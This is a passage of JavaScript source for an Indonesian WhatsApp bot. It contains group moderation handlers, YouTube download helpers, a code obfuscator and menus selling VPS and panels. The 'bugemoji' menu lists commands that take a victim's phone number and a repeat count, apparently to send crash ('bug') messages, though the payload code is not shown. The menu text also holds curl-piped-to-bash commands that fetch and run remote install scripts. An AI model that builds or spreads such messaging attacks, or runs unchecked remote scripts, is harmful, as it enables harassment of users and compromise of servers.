        if (isAdmins) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`})
        if (!isOwner) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`})
        kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
// Anti Link
        if (antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply(mess.only.badmin)
        let gclink = (`https://chat.whatsapp.com/`+await Biiofc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`})
        if (isAdmins) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`})
        if (!isOwner) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`})
        kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\n@${kice.split("@")[0]} https://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

 // Antiwame by xeon
  if (antiwame)
  if (budy.includes(`wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 200 MEMBER SUKA BAGI BAGI VPS DAN ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiwame)
  if (budy.includes(`wa.me/`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 200 MEMBER SUKA BAGI BAGI VPS DAN ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 200 MEMBER SUKA BAGI BAGI VPS DAN ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirus by xeon
  if (antivirus) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply(mess.only.badmin)
          await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//antilink youtube video by xeon
if (antilinkytvideo)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (antilinkytchannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (antilinkinstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (antilinkfacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (antilinktelegram)
   if (budy.includes("https://t.me/")){
if (antilinktelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (antilinktiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (antilinktwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by xeon
if (antilinkall)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 150 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 150 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\n@${m.sender.split("@")[0]} https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `𝗖𝗲𝗸𝗶𝗹-𝗠𝗱`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Biiofc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Biiofc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

let vote = db.others.vote = []

let teks_format =`*Berikut ini cara order kode otp*

_Example_
.order id

_Contoh_
.order 14

untuk melihat id layanan
silahkan ketik .layanan`

let teks_format2 = `Format Salah !!

_Example_
.getorder <order_id>

_Contoh_
.getorder 55778888
`

Biiofc.readMessages([m.key])

 switch (command) {
case "menu": case "zaa": case "anggun": case "nish": case "MANZ": case "kon": case "ni": case "nzm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(mess.only.user)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

*_I Am Botzz Private Made By OktzOffc_*
*_If There Is An Error!!_*
*_Please Report To Developer_*
*_Berikut Saldo anda_ Rp:* *${toRupiah(cekSaldo(sender, db_saldo))}*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
╔┈┈「 *BOT INFO* 」┈┈
╎ダNama Creator : *${namaCreator}*
╎ダNomor Creator : *@${owned.split("@")[0]}*
╎ダVersion Baileys : *^${version}*
╎ダType Baileys : *Multi-device*
╎ダJam : *${jam}*
╎ダTanggal : *${tanggal}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*${runtime(process.uptime())}*
╔┈┈( *LIST MENU* )┈┈
╎
╎⭔${prefix}*groupmenu*
╎⭔${prefix}*ownermenu*
╎⭔${prefix}*downloadmenu*
╎⭔${prefix}*pushkontakmenu*
╎⭔${prefix}*topupmenu*
╎⭔${prefix}*bugmenu*
╎⭔${prefix}*panelmenu*
╎⭔${prefix}*otomatismenu*
╎⭔${prefix}*soundmenu*
╎⭔${prefix}*domainmenu*
╎⭔${prefix}*testimonimenu*
╎⭔${prefix}*sewabotmenu*
╎⭔${prefix}*suntikmenu*
╎⭔${prefix}*randommenu*
╎⭔${prefix}*textwamenu*
╎⭔${prefix}*jadibotmenu*
╎⭔${prefix}*saldomenu*
╎⭔${prefix}*storemenu*
╎⭔${prefix}*voicemenu*
╎⭔${prefix}*pm2menu*
╎⭔${prefix}*jebehmenu*
╎⭔${prefix}*stalkmenu*
╎⭔${prefix}*vpsmenu*
╎⭔${prefix}*otpmenu*
╎⭔${prefix}*scmenu*
╎⭔${prefix}*swmenu*
╎⭔${prefix}*aimenu*
╚┈┈┈┈┈┈┈┈┈┈┈┈
 *Powered By* *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "bugemoji": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

╔┈┈( *BUG EMOJI* )┈┈
╎
╎⭔ ${prefix}🌷 62xx|Jumblah
╎⭔ ${prefix}🐲 62xx|jumblah
╎⭔ ${prefix}🐉 62xx|Jumblah
╎⭔ ${prefix}🌵 62xx|Jumblah
╎⭔ ${prefix}🎄 62xx|Jumblah
╎⭔ ${prefix}🌲 62xx|Jumblah 
╎⭔ ${prefix}🌳 62xx|Jumblah
╎⭔ ${prefix}🌱 62xx|Jumblah
╎⭔ ${prefix}😈 62xx|Jumblah
╎⭔ ${prefix}🗿 62xx|Jumblah
╎⭔ ${prefix}😎 62xx|Jumblah
╚┈┈┈┈┈┈┈┈┈┈┈┈
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break 
        case "panelmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

╔┈┈( *PANEL MENU* )┈┈
╎
╎⭔${prefix}serverpanel1
╎⭔${prefix}serverpanel2
╎⭔${prefix}serverpanel3
╚┈┈┈┈┈┈┈┈┈┈┈┈
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case "jebehmenu": case "jb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

╔┈┈( *JEBEH MENU* )┈┈
╎
╎⭔${prefix}formatpost
╎⭔${prefix}formatneed
╎⭔${prefix}feerekber
╎⭔${prefix}formatpencairan
╎⭔${prefix}mc *_nama gc_*
╎⭔${prefix}allrec
╎⭔${prefix}danamasuk
╎⭔${prefix}donerekber
╎⭔${prefix}donemc *_isi manual_*
╚┈┈┈┈┈┈┈┈┈┈┈┈
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "cmdpanel": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

CMD INSTALL CONTROL PANEL

bash <(curl -s https://raw.githubusercontent.com/Ferks-FK/ControlPanel-Installer/development/install.sh)

 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "cmdthema": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

CMD THEMA STELLAR

1. curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash - 

2. apt install -y nodejs 

3. npm i -g yarn 

4. cd /var/www/pterodactyl 

5. yarn add react-feather  

6. php artisan migrate 

7. yarn build:production
 
8. php artisan view:clear

*NOTE :* MASUKIN CMD NYA 1 1
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case "jadibotmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

╔┈┈( *JADIBOT MENU* )┈┈
╎
╎⭔${prefix}stopjadibot
╎⭔${prefix}listjadibot
╎⭔${prefix}jadibot
╚┈┈┈┈┈┈┈┈┈┈┈┈
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case "listvps1": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

╔┈┈( *LIST VPS LINODE* )┈┈
╎
╎
╎🚀 RAM 2GB CORE 1 : => *25K* <= 
╎🚀 RAM 4GB CORE 2 : => *45K* <=
╎🚀 RAM 8GB CORE 4 : => *55K* <=
╎🚀 RAM 16GB CORE 6 : => ~*130K*~ > *80K* <=
╚┈┈┈┈┈┈┈┈┈┈┈┈
=>   *_𝙂𝙤𝙤𝙙 𝙌𝙪𝙖𝙡𝙞𝙩𝙮 ✅_* <=
=>   *_𝘽𝙚𝙧𝙜𝙖𝙧𝙖𝙣𝙨𝙞 ✅_*      <=
=>   *_𝘿𝙖𝙥𝙚𝙩 𝘽𝙤𝙣𝙪𝙨 ✅_*  <=

*‼️GARANSI ON JIKA TIDAK MELANGGAR TOS!!!*
1. NO MINING
2. NO CPU 100%
3. NO USE DDOS
*_GARANSI 10H ON ✅_*

*JIKA MELANGGAR T.O.S GARANSI HANGUS!!!*

*MAU CLAIM GARANSI? KIRIM BUKTI TRANSFER & CHAT*
‼️NO BUKTI NO GARANSI
‼️ MAKSA REFF NO BUKTI? BLOCK!!! 

*KEUNTUNGAN BUY VPS?*
📍BISA OPEN ADMIN PANEL
📍BISA OPEN RESELLER PANEL
📍BISA DI PAKAI BUAT SERVER PRIBADI
📍BISA JUALAN PANEL
📍BISA OPEN JASA RUN BOT
📍BISA OPEN MURPUSH
📍BISA OPEN MURBUG DLL


 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case "listvps2": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LIST VPS DIGITAL OCEAN* )▭▬▭


🚀 RAM 2GB CORE 1 : => *25K* <=
🚀 RAM 4GB CORE 2 : => *45K* <=
🚀 RAM 8GB CORE 4 : => *55K* <=
🚀 RAM 16GB CORE 6 : => ~*130K*~ > *80K* <=

=>   *_𝙂𝙤𝙤𝙙 𝙌𝙪𝙖𝙡𝙞𝙩𝙮 ✅_* <=
=>   *_𝘽𝙚𝙧𝙜𝙖𝙧𝙖𝙣𝙨𝙞 ✅_*      <=
=>   *_𝘿𝙖𝙥𝙚𝙩 𝘽𝙤𝙣𝙪𝙨 ✅_*  <=

*‼️GARANSI ON JIKA TIDAK MELANGGAR TOS!!!*
1. NO MINING
2. NO CPU 100%
3. NO USE DDOS
*_GARANSI 10H ON ✅_*

*JIKA MELANGGAR T.O.S GARANSI HANGUS!!!*

*MAU CLAIM GARANSI? KIRIM BUKTI TRANSFER & CHAT*
‼️NO BUKTI NO GARANSI
‼️ MAKSA REFF NO BUKTI? BLOCK!!! 

*KEUNTUNGAN BUY VPS?*
📍BISA OPEN ADMIN PANEL
📍BISA OPEN RESELLER PANEL
📍BISA DI PAKAI BUAT SERVER PRIBADI
📍BISA JUALAN PANEL
📍BISA OPEN JASA RUN BOT
📍BISA OPEN MURPUSH
📍BISA OPEN MURBUG DLL


 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case "voicemenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

╔┈┈( *VOICE MENU* )┈┈
╎
╎⭔${prefix}ardi
╎⭔${prefix}siti
╎⭔${prefix}tuti
╎⭔${prefix}gadis
